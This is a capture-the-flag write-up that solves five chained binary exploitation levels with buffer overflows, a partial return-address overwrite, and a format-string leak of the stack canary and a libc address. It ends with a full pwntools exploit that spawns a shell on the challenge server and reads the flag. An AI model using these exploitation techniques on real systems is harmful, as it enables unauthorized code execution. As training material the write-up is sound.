### Solved by superkojiman

This one was kind of fun. 5 binaries are included in the zip file along with their corresponding libc.so. Each binary is a level that can be solved individually, but when we connect to the target it starts off at level 1, and progresses up to level 5 as you solve each one. Essentially each binary will call the next once you solve it. 

#### Level 1
This one's easy. At 0x80485eb it calls `scanf("%d")` and checks if the input is equal to 0x3da76, or 252534 in decimal. If it is, we win. 

```
# echo 252534 | ./level1
----- LEVEL 1 -----
Access token please: Just a warmup. Level 1 complete.
----- LEVEL 2 -----
What is your party name? Ah sorry about that. We're not accepting any new parties.
```

#### Level 2

If we look at the disassembly we see that at 0x804860a it checks if a local variable is equal to 0xcc07c9. This binary also prompts us for input using `scanf()` to read up to 128 bytes. There's no stack buffer overflow here since the saved return pointer is 268 bytes from the start of the buffer, and it's only reading in up to 128 bytes

```
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
 ► 0x8048602 <main+71>     call   __isoc99_scanf@plt <0x80484a0>
        format: 0x804874a ◂— '%128s'
        vararg: 0xffdd7450 —▸ 0xffdd748e ◂— 0xffff0000

   0x8048607 <main+76>     add    esp, 0x10
   0x804860a <main+79>     cmp    dword ptr [ebp - 0xc], 0xcc07c9
   0x8048611 <main+86>     jne    main+137 <0x8048644>

   0x8048613 <main+88>     sub    esp, 0xc
   0x8048616 <main+91>     push   0x8048750
   0x804861b <main+96>     call   puts@plt <0x8048460>

   0x8048620 <main+101>    add    esp, 0x10
   0x8048623 <main+104>    sub    esp, 4
   0x8048626 <main+107>    push   0
   0x8048628 <main+109>    push   0x8048783
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffdd7440 —▸ 0x804874a ◂— and    eax, 0x73383231 /* '%128s' */
01:0004│      0xffdd7444 —▸ 0xffdd7450 —▸ 0xffdd748e ◂— 0xffff0000
02:0008│      0xffdd7448 —▸ 0xf77c4918 ◂— 0
03:000c│      0xffdd744c ◂— 0xf0b5ff
04:0010│ eax  0xffdd7450 —▸ 0xffdd748e ◂— 0xffff0000
05:0014│      0xffdd7454 ◂— 0x1
06:0018│      0xffdd7458 ◂— 0xc2
07:001c│      0xffdd745c —▸ 0xf76696bb (handle_intel+107) ◂— add    esp, 0x10
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0  8048602 main+71
   f 1 f75f1637 __libc_start_main+247
Breakpoint *0x8048602
pwndbg> retaddr
0xffdd755c —▸ 0x80484e1 (_start+33) ◂— hlt
pwndbg> p/d 0xffdd755c - 0xffdd7450
$1 = 268
```

However, we can overwrite the value of this local variable at offset 124. This can be found using a cyclic pattern and feeding it into `scanf()`: 

```
 ► 0x804860a <main+79>     cmp    dword ptr [ebp - 0xc], 0xcc07c9
   0x8048611 <main+86>     jne    main+137 <0x8048644>
    ↓
   0x8048644 <main+137>    sub    esp, 0xc
   0x8048647 <main+140>    push   0x804878c
   0x804864c <main+145>    call   puts@plt <0x8048460>

   0x8048651 <main+150>    add    esp, 0x10
   0x8048654 <main+153>    mov    eax, 0
   0x8048659 <main+158>    mov    ecx, dword ptr [ebp - 4]
   0x804865c <main+161>    leave
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffa2f770 ◂— 0x61616161 ('aaaa')
01:0004│      0xffa2f774 ◂— 0x61616162 ('baaa')
02:0008│      0xffa2f778 ◂— 0x61616163 ('caaa')
03:000c│      0xffa2f77c ◂— 0x61616164 ('daaa')
04:0010│      0xffa2f780 ◂— 0x61616165 ('eaaa')
05:0014│      0xffa2f784 ◂— 0x61616166 ('faaa')
06:0018│      0xffa2f788 ◂— 0x61616167 ('gaaa')
07:001c│      0xffa2f78c ◂— 0x61616168 ('haaa')
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0  804860a main+79
   f 1 f75f7637 __libc_start_main+247
pwndbg> x/wx $ebp-0xc
0xffa2f7ec:     0x62616167
pwndbg> !
# cyclic -o 0x62616167
124
```

Great, so pretty easy to win this level now:

```
# python -c 'print "A"*124 + "\xc9\x07\xcc"' | ./level2
----- LEVEL 2 -----
What is your party name? Now we're cooking with gas. Lets ramp it up a bit.
----- LEVEL 3 -----
Just a simple question...what is your favorite spell?
```

#### Level 3

Checking the disassembly we find a function called `goal()` which basically prints the winning message and executes level4, indicating this is where we want to go. `goal()` itself isn't called from anywhere else in the binary, so we need to redirect execution here. 

The `interact()` function calls `fread()` Let's break there and see what's happening. 

```
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
 ► 0x80485f5 <interact+58>    call   fread@plt <0x8048460>
        ptr: 0xffe64634 ◂— 0x0
        size: 0x1
        n: 0x89
        stream: 0xf77375a0 (_IO_2_1_stdin_) ◂— 0xfbad2088

   0x80485fa <interact+63>    add    esp, 0x10
   0x80485fd <interact+66>    nop
   0x80485fe <interact+67>    leave
   0x80485ff <interact+68>    ret

   0x8048600 <main>           lea    ecx, dword ptr [esp + 4]
   0x8048604 <main+4>         and    esp, 0xfffffff0
   0x8048607 <main+7>         push   dword ptr [ecx - 4]
   0x804860a <main+10>        push   ebp
   0x804860b <main+11>        mov    ebp, esp
   0x804860d <main+13>        push   ecx
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffe64620 —▸ 0xffe64634 ◂— 0x0
01:0004│      0xffe64624 ◂— 0x1
02:0008│      0xffe64628 ◂— 0x89
03:000c│      0xffe6462c —▸ 0xf77375a0 (_IO_2_1_stdin_) ◂— 0xfbad2088
04:0010│      0xffe64630 ◂— 0x3
05:0014│ eax  0xffe64634 ◂— 0x0
06:0018│      0xffe64638 —▸ 0xf7770000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f3c
07:001c│      0xffe6463c —▸ 0x80482cc ◂— jae    0x8048337 /* 'signal' */
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0  80485f5 interact+58
   f 1  8048623 main+35
   f 2 f759d637 __libc_start_main+247
Breakpoint *0x80485f5
pwndbg> retaddr
0xffe646bc —▸ 0x8048623 (main+35) ◂— sub    esp, 0xc
0xffe6474c —▸ 0x80484e1 (_start+33) ◂— hlt
pwndbg> p/d 0xffe646bc - 0xffe64634
$1 = 136
pwndbg> p/d 0x89
$2 = 137
```

`fread()` will read up to 137 bytes into a buffer. The saved return ponter is at offset 136, which means we can overwrite the least significant byte of the saved return pointer. 

The current return address is at 0x8048623. The address of `goal()` is 0x804862d. So if we overwrite the last byte with 0x2d we win. 

```
# python -c 'print "A"*136 + "\x2d"' | ./level3
----- LEVEL 3 -----
Just a simple question...what is your favorite spell? Any overwrite is a bad overwrite! Level 3 complete.
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Invalid action -355028
Thanks for playing�Ho�Ъp�$n�!
```

#### Level 4

Things are getting interesting at this point. We're prompted for an action and a name. The action is checked against a jump table with 100 different actions. The name is obtained from `get_name()` and can be 127 bytes long. 

To be honest I'm not 100% sure how this binary works, because after you select one action it seems to jump to another action in certain cases. I decided to take the lazy way and just write a script to execute each action and to pass in a name of 127 bytes in size to see what happens. 

```
# for i in {0..99}; do printf "${i}\n`cyclic 127`\n" | ./level4; done
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 0...
Executing 59...
Sorting 39...
Result 3
Thanks for playing aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaa!
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 1...
Result 120
Thanks for playing aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaa!
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 2...
.
.
.
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 73...
Segmentation fault (core dumped)
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 74...
Computing 09...
Result 16
Thanks for playing aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaa!
.
.
.
```

Action 73 triggers a segmentation fault and core dumps. Let's see what's going in in the core dump in gdb.

```
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x62616163 ('caab')
 EBX  0x0
 ECX  0xffffffff
 EDX  0xf7765870 ◂— add    byte ptr [eax], al
 EDI  0xf7764000 ◂— mov    al, 0x1d
 ESI  0xf7764000 ◂— mov    al, 0x1d
 EBP  0xffb2bb88 —▸ 0xffb2bbb8 ◂— 0x0
 ESP  0xffb2bb6c ◂— 0x804a469
 EIP  0x62616163 ('caab')
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
Invalid address 0x62616163
```

Looks like we've overwritten the saved return pointer somehow.

```
# cyclic -o 0x62616163
108
```

This is at offset 108. So we just need to overwrite the saved return pointer with the address of `goal()` and we're done. 

```
# python -c 'print "73\n" + "A"*108 + "\x7c\xa4\x04\x08"' | ./level4
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 73...
Excellent reverse engineering! Level 4 complete.
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: Your chosen path leads you...straight down a mine shaft. You perish.
````

#### Level 5

Final level! This one gives us the option to exploit the binary using either a small buffer overflow, a large buffer overflow, or a format string vulnerability. Easy, I thought, let's just go with the large buffer overflow.

Turns out, not so much. 

A stack canary is compiled into the binary, so both of the overflow functions will just cause the binary to abort if we overwrite the stack canary. I took a look at the format string angle and realized I could use it to leak the stack canary which was at offset 71: 

```
# ./level5
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: 3
Path 3 - The possibilities are endless!
%71$p
0x4744f44a6bfb3300
Still alive?

Choice [0 exit][1 small][2 large][3 format]:
```

With the stack canary leaked, I could now go the overflow route. The easiest way to solve it would be to return to a one-gadget-rce to get an instant shell. However to do that, I needed to leak an address in libc so I could calculate its base address and add the offset of the one-gadget-rce in the provided libc.so to it.

A libc leak can be obtained from the format string vulnerability as well. At offset 67 we have an address for _IO_2_1_stdout. This is at offset 0x3c5620 in the provided libc.so

```
# nc localhost 1337
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: 3
Path 3 - The possibilities are endless!
%67$p
0x7ffff7dd2620
Still alive?

Choice [0 exit][1 small][2 large][3 format]:
```

We have all the pieces. The stack canary is at offset 24 in the small overflow. The saved return pointer is at offset 40. The meat of the exploit looks like this:

```
    io_stdout_offset = 0x3c5620
    libc_base = io_stdout - io_stdout_offset
    print "libc base:", hex(libc_base)

    one_gadget_offset  = 0x45216
    one_gadget = libc_base + one_gadget_offset
    print "one-gadget-rce:", hex(one_gadget)
    r.sendline(small)
    print r.recv()

    buf = ""
    buf += "A"*(small_offset - 16)          # junk
    buf += p64(canary)                      # stack canary
    buf += p64(0x646464646464)              # saved frame pointer
    buf += p64(one_gadget)                  # saved return pointer
    buf += "\x00"*(small_max - len(buf))    # more junk
    r.sendline(buf)
    r.interactive()
```

This will give us a shell on the target. 

#### Final exploit

To obtain the flag, we need to pass each level on the target. As I said earlier, each solved challenge will execute the next one, which means we need to continously communicate with the target until we get the flag. Here's the final exploit combining all the challenge solutions:

```
#!/usr/bin/env python

import sys
from pwn import *
context(os="linux", arch="amd64")

def level1():
    print r.recv()
    r.sendline("252534")
    print r.recv()

def level2():
    buf = ""
    buf += "A"*124
    buf += "\xc9\x07\xcc"
    print r.recv()
    r.sendline(buf)
    print r.recv()

def level3():
    buf = ""
    buf += "A"*136
    buf += "\x2d"
    print r.recv()
    r.sendline(buf)
    print r.recv()

def level4():
    print r.recv()
    r.sendline("73")
    print r.recv()
    buf = ""
    buf += "A"*108
    buf += p32(0x804a47c)
    r.sendline(buf)
    print r.recv()

def level5():
    fmt = "3"

    small = "1"
    small_offset = 40
    small_max = 64

    # leak the stack canary
    r.recv()
    r.sendline(fmt)
    r.recv()

    canary_leak = 71     # canary is at offset of the format string leak
    buf = ""
    buf += "%" + str(canary_leak) + "$p"

    r.sendline(buf)
    print r.recv()

    canary = r.recv().split("\n")[0]
    canary = int(str(canary), 16)
    print "leaked canary:", hex(canary)

    # leak address of _IO_2_1_stdout
    r.sendline(fmt)
    r.recv()
    io_stdout_leak = 67
    buf = ""
    buf += "%" + str(io_stdout_leak) + "$p"

    r.sendline(buf)
    print r.recv()

    io_stdout = r.recv().split()[0]
    io_stdout = int(io_stdout, 16)
    print "leaked io_stdout:", hex(io_stdout)

    io_stdout_offset = 0x3c5620
    libc_base = io_stdout - io_stdout_offset
    print "libc base:", hex(libc_base)

    one_gadget_offset  = 0x45216
    one_gadget = libc_base + one_gadget_offset
    print "one-gadget-rce:", hex(one_gadget)
    r.sendline(small)
    print r.recv()

    buf = ""
    buf += "A"*(small_offset - 16)          # junk
    buf += p64(canary)                      # stack canary
    buf += p64(0x646464646464)              # saved frame pointer
    buf += p64(one_gadget)                  # saved return pointer
    buf += "\x00"*(small_max - len(buf))    # more junk
    r.sendline(buf)
    r.interactive()

if __name__ == "__main__":
    global r
    r = remote("chal1.swampctf.com", 1337)

    level1()
    level2()
    level3()
    level4()
    level5()
```

And here it is in action:

```
# ./sploit.py
[+] Opening connection to chal1.swampctf.com on port 1337: Done
----- LEVEL 1 -----

Access token please:
Just a warmup. Level 1 complete.
----- LEVEL 2 -----
What is your party name?
Now we're cooking with gas. Lets ramp it up a bit.

----- LEVEL 3 -----
Just a simple question...what is your favorite spell?
Any overwrite is a bad overwrite! Level 3 complete.

----- LEVEL 4 -----
Choose an action:
Hey traveler, what is your name?
Running action 73...


leaked canary: 0x2a4cf8dc6617f900


leaked io_stdout: 0x7fbcb1320620
libc base: 0x7fbcb0f5b000
one-gadget-rce: 0x7fbcb0fa0216
Path 1 - Give yourself an extra challenge :)
[*] Switching to interactive mode

$ ls
flag
level1
level2
level3
level4
level5
$ cat flag
flag{I_SurV1v3d_th3_f1n4l_b0ss}
```
